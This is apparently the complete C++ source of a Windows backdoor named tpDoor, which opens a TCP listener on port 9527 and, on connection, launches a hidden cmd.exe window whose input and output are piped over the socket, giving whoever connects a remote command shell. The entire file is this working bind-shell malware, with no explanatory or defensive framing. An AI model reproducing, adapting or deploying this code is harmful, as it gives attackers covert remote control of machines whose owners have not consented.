// tpDoor.cpp : Defines the entry point for the application.
//


#include "tpDoor.h"

BOOL SocketInit()
{
	WSADATA wsaData = {0};
	if ( WSAStartup(MAKEWORD(2, 2), &wsaData) == NO_ERROR ) {
		return TRUE;
	}else{
		return FALSE;
	}
}

int SendData(SOCKET m_Sock, void *pBuf, DWORD dwBufLen)
{
	if ( m_Sock == INVALID_SOCKET || !pBuf || dwBufLen <= 0 ) {
		return -1;
	}
	int iCurrSend = 0, offset = 0;
	do {
		iCurrSend = send(m_Sock, (char *)pBuf+offset, dwBufLen, 0);
		if ( iCurrSend <= 0 ) {
			break;
		}
		dwBufLen -= iCurrSend;
		offset += iCurrSend;
	} while ( dwBufLen > 0 );
	return offset;
}

BOOL bExit = FALSE;
#define RECV_BUF_LEN 4096
char szCmdBuf[MAX_PATH] = {0};

DWORD WINAPI ThreadInputProc(LPVOID lpParam)
{
	CThreadNode tNode = *(CThreadNode *)lpParam;
	DWORD dwWrited = 0, dwRecvd = 0;
	char szBuf[MAX_PATH] = {0};
	BOOL bRet = FALSE;
	while ( TRUE ) {
		dwRecvd = recv(tNode.m_Sock, szBuf, MAX_PATH, 0);
		if ( dwRecvd > 0 && dwRecvd != SOCKET_ERROR ) {
			WriteFile(tNode.hPipe, szBuf, dwRecvd, &dwWrited, NULL);
		}else{
			closesocket(tNode.m_Sock);
			WriteFile(tNode.hPipe, "exit\r\n", sizeof("exit\r\n"), &dwWrited, NULL);
			bExit = TRUE;
			break;
		}
		Sleep(50);
	}
	return TRUE;
}

DWORD WINAPI ThreadOutputProc(LPVOID lpParam)
{
	CThreadNode tNode = *(CThreadNode *)lpParam;
	char szBuf[RECV_BUF_LEN] = {0};
	DWORD dwReadLen = 0, dwTotalAvail = 0;
	BOOL bRet = FALSE;
	while ( !bExit ) {
		dwTotalAvail = 0;
		bRet = PeekNamedPipe(tNode.hPipe, NULL, 0, NULL, &dwTotalAvail, NULL);
		if ( bRet && dwTotalAvail > 0 ) {
			bRet = ReadFile(tNode.hPipe, szBuf, RECV_BUF_LEN, &dwReadLen, NULL);
			if ( bRet && dwReadLen > 0 ) {
				SendData(tNode.m_Sock, szBuf, dwReadLen);
			}
			Sleep(50);
		}
	}
	return TRUE;
}

BOOL StartShell(UINT uPort)
{
	if ( !SocketInit() ) {
		return FALSE;
	}
	SOCKET m_ListenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if ( m_ListenSock == INVALID_SOCKET ) {
		return FALSE;
	}
	sockaddr_in sServer = {0};
	sServer.sin_family = AF_INET;
	sServer.sin_addr.s_addr = htonl(INADDR_ANY);
	sServer.sin_port = htons(uPort);
	if ( bind(m_ListenSock, (sockaddr *)&sServer, sizeof(sServer)) == SOCKET_ERROR ) {
		return FALSE;
	}
	if ( listen(m_ListenSock, 5) == SOCKET_ERROR ) {
		return FALSE;
	}
	SOCKET m_AcceptSock = accept(m_ListenSock, NULL, NULL);
	// Create Pipe;
	CThreadNode m_ReadNode, m_WriteNode;
	STARTUPINFO si = {0};
	si.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION pi = {0};
	DWORD dwThreadRead = 0, dwThreadWrite = 0;
	HANDLE hReadPipe1 = NULL, hWritePipe1 = NULL; // Input the command;
	HANDLE hReadPipe2 = NULL, hWritePipe2 = NULL; // Get the command results;
	HANDLE hThreadOutput = NULL, hThreadInput = NULL;
	SECURITY_ATTRIBUTES sa = {0};
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	if ( !CreatePipe(&hReadPipe1, &hWritePipe1, &sa, 0) || !CreatePipe(&hReadPipe2, &hWritePipe2, &sa, 0) ) {
		return FALSE;
	}
	m_ReadNode.m_Sock = m_WriteNode.m_Sock = m_AcceptSock;

	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.hStdInput = hReadPipe1;
	si.hStdOutput = si.hStdError = hWritePipe2;
	si.wShowWindow = SW_HIDE;
	TCHAR szCmdLine[MAX_PATH] = {0};
	GetSystemDirectory(szCmdLine, MAX_PATH);
	_tcscat_s(szCmdLine, MAX_PATH, _T("\\cmd.exe"));
	if ( !CreateProcess(szCmdLine, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi) ) {
		return FALSE;
	}
	m_ReadNode.hPipe = hReadPipe2;
	hThreadOutput = CreateThread(NULL, 0, ThreadOutputProc, &m_ReadNode, 0, &dwThreadWrite);
	m_WriteNode.hPipe = hWritePipe1;
	hThreadInput = CreateThread(NULL, 0, ThreadInputProc, &m_WriteNode, 0, &dwThreadRead);

	HANDLE szHandles[] = { hThreadOutput, hThreadInput };
	WaitForMultipleObjects(2, szHandles, TRUE, INFINITE);
	return TRUE;
}

int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	StartShell(9527);
	return 0;
}